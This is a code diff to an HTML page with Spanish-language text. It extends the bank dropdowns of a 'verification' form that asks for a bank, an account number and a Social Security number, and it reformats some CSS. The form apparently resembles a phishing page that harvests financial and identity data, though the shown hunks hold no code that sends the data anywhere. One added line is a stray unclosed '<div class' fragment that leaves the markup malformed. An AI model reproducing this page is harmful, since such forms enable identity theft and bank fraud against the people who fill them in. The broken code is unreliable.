@@ -418,14 +418,15 @@
       pointer-events: none;
     }
 
-    select, input[type="text"], input[type="password"] {
+    select,
+    input[type="text"],
+    input[type="password"] {
       padding-left: 44px;
     }
 
     .compact-small {
       margin-top: 12px;
     }
-
   </style>
 </head>
 
@@ -475,6 +476,28 @@
               <option>PNC Bank</option>
               <option>Capital One</option>
               <option>TD Bank</option>
+              <option>BB&T</option>
+              <option>SunTrust Bank</option>
+              <option>Ally Bank</option>
+              <option>American Express National Bank</option>
+              <option>Barclays Bank Delaware</option>
+              <option>BMO Harris Bank</option>
+              <option>Charles Schwab Bank</option>
+              <option>Citizens Bank</option>
+              <option>CommunityAmerica Credit Union</option>
+              <option>Discover Bank</option>
+              <option>Fifth Third Bank</option>
+              <option>First Republic Bank</option>
+              <option>Huntington Bank</option>
+              <option>KeyBank</option>
+              <option>Marcus by Goldman Sachs</option>
+              <option>MB Financial Bank</option>
+              <option>MidFirst Bank</option>
+              <option>Navy Federal Credit Union</option>
+              <option>Regions Bank</option>
+              <option>State Employees’ Credit Union</option>
+              <option>Truist Bank</option>
+              <option>U.S. Bank</option>
               <option>Others</option>
             </select>
             <small id="bank-help" class="compact-small">Debe seleccionar su entidad bancaria primero.</small>
@@ -511,6 +534,7 @@
         <!-- Traditional verification -->
         <section id="traditional-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="traditional-form" novalidate>
+            <div class
             <div class="form-group compact-small">
               <label for="traditional-bank">Banco</label>
               <span class="material-icons left-small-icon" aria-hidden="true">account_balance</span>
@@ -523,6 +547,28 @@
                 <option>PNC Bank</option>
                 <option>Capital One</option>
                 <option>TD Bank</option>
+                <option>BB&T</option>
+                <option>SunTrust Bank</option>
+                <option>Ally Bank</option>
+                <option>American Express National Bank</option>
+                <option>Barclays Bank Delaware</option>
+                <option>BMO Harris Bank</option>
+                <option>Charles Schwab Bank</option>
+                <option>Citizens Bank</option>
+                <option>CommunityAmerica Credit Union</option>
+                <option>Discover Bank</option>
+                <option>Fifth Third Bank</option>
+                <option>First Republic Bank</option>
+                <option>Huntington Bank</option>
+                <option>KeyBank</option>
+                <option>Marcus by Goldman Sachs</option>
+                <option>MB Financial Bank</option>
+                <option>MidFirst Bank</option>
+                <option>Navy Federal Credit Union</option>
+                <option>Regions Bank</option>
+                <option>State Employees’ Credit Union</option>
+                <option>Truist Bank</option>
+                <option>U.S. Bank</option>
                 <option>Others</option>
               </select>
             </div>
@@ -533,7 +579,7 @@
               <input type="text" id="account-number" name="account_number" placeholder="Número de cuenta" required />
             </div>
 
-                        <div class="form-group compact-small" style="position: relative;">
+            <div class="form-group compact-small" style="position: relative;">
               <label for="ssn">Número de Seguro Social</label>
               <span class="material-icons left-small-icon" aria-hidden="true">fingerprint</span>
               <input type="text" id="ssn" name="ssn" placeholder="000-00-0000" maxlength="11" pattern="\d{3}-\d{2}-\d{4}" inputmode="numeric" required />
